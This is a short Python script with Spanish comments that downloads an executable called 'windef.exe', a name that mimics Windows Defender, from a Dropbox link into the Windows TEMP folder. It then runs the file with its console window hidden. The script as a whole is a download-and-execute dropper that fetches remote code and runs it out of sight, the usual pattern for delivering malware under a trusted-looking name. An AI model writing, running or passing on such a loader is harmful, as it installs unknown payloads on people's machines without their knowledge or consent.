import requests
import subprocess
import os

# URL del archivo a descargar
url = 'https://dl.dropbox.com/scl/fi/u8qpwjrtniiyqlv48o7h4/windef.exe?rlkey=vep7ia8tg6v0tb6uzsjjv0960&dl=0'

# Ruta donde se guardará el archivo
archivo_destino = os.path.join(os.environ['TEMP'], 'windef.exe')

# Imprimir mensaje de inicio de descarga
print(f'Descargando {url}...')

# Descargar el archivo
response = requests.get(url)
with open(archivo_destino, 'wb') as archivo:
    archivo.write(response.content)

# Imprimir mensaje de finalización de descarga
print(f'Archivo descargado en: {archivo_destino}')

# Imprimir mensaje de inicio de ejecución
print(f'Ejecutando {archivo_destino}...')

# Ejecutar el archivo descargado
subprocess.run([archivo_destino], creationflags=subprocess.CREATE_NO_WINDOW, shell=True)

# Imprimir mensaje de finalización de ejecución
print('Proceso completado.')
